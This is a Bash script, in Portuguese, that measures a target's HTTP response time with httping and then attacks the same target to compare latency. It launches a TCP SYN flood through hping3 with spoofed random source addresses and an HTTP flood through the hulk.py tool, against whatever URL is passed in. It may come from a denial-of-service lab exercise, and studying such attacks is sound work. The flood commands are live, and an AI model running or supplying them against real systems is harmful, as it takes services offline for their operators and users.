#!/bin/bash

pingu()
{
	IP=$1
	REP=$2
	PRINT=$3
	FILENAME=$4
	
	echo "Calculating time to $IP... "
	httping $IP -c $REP > "temp_httping-$FILENAME.txt"
	media=$(tail -n 1 "temp_httping-$FILENAME.txt" | awk '{print $4}' | cut -d "/" -f2)
	min=$(tail -n 1 "temp_httping-$FILENAME.txt" | awk '{print $4}' | cut -d "/" -f1)
    	max=$(tail -n 1 "temp_httping-$FILENAME.txt" | awk '{print $4}' | cut -d "/" -f3)
    	media=${media}
	acum=0
	temp=0
	temp2=0
    
    	data=$(grep -w connected "temp_httping-$FILENAME.txt" | sed 's/^.*=\s*\(.*\) ms /\1/' )
    	echo "$data" > "test-$FILENAME.txt"

    	for valor in $data
    	do
        	temp=$(echo "scale=2; $valor-$media" | bc -l)
        	temp2=$(echo "scale=2; $temp*$temp" | bc -l)
        	acum=$(echo "scale=2; $acum+$temp2" | bc -l)
	done < "temp_httping-$FILENAME.txt"
	
    	n=$(($REP-1))
    	echo "$PRINT"
    	echo "Minimo: $min"
    	echo "Media: $media"
    	echo "Maximo: $max"
	
    	variancia=$(echo "scale=2; $acum/$n" | bc -l)
    	echo "variancia: $variancia"
   	dpad=$(echo "sqrt ( $variancia )" | bc -l ) ; echo "Desvio Padrao: $dpad" 
}

[ $1 ] && [ $2 ] || {
	echo ""
	echo "Usage: sudo bash $0 <url> <reps>"
	exit
	}

IP=$1
REP=$2

for CMD in xterm httping hping3
do
	if [ ! `which $CMD` ]
	then
		echo ""
		echo "[ERROR] Missing command/app \"$CMD\". Install  it first"
		echo ""
		echo "try: sudo apt install $CMD -y"
		echo ""
		exit
	fi
done

pingu $IP $REP "Time without attack (in ms):" "no-attack"


echo ""
echo "Next test: TCP SYN FLOOD with hping3"
echo -n "Starting... "
sleep 5

echo "GO!"
xterm -e "sudo hping3 -c 15000 -d 120 -S -w 512 -p 80 --flood --rand-source $IP" &
sleep 5
pingu $IP $REP "Time with TCP SYN FLOOD (in ms):" "hping3"

sleep 10

echo ""
echo "Next test: Flooding atack with hulk."
echo -n "Starting..."
echo "Smash!"

xterm -e "python hulk.py $IP" &
sleep 3
pingu $IP $REP "Time with Flooding (in ms):" "hulk"
bash hulk-buster.sh



#rm temp_httping.txt
